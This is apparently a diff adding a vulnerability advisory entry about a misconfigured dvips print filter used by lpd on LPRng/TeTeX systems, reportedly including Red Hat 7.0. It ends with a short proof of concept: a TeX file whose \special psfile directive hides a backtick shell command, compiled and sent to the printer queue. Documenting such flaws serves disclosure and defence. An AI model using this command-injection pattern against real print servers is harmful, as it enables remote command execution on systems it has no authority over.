@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/3241/info
+
+'dvips' is a utility that converts DVI documents to PostScript. It is an optional component of the TeTeX text formatting package. When installed on a system where LPRnG and TeTeX are in use, 'dvips' will be invoked by 'lpd' when a DVI document is to be printed if a printfilter exists for it.
+
+On some systems, 'dvips' is not invoked in a safe manner. As a result, it may be possible for remote attackers to execute commands through certain DVI directives on vulnerable systems through 'lpd'.
+
+It should be noted that this vulnerability is only due to the configuration of the DVI printfilter on some systems. There is no specific vulnerability in lpd, dvips or any other executable component. It is simply an error in the default configuration present on some systems. It has been reported that Red Hat 7.0 is vulnerable with the default configuration installed with the RPM packages.
+
+cat >exploit.tex <<EOF
+\special{psfile="`command to be executed`"}
+\end
+EOF
+tex exploit.tex
+lpr exploit.dvi 
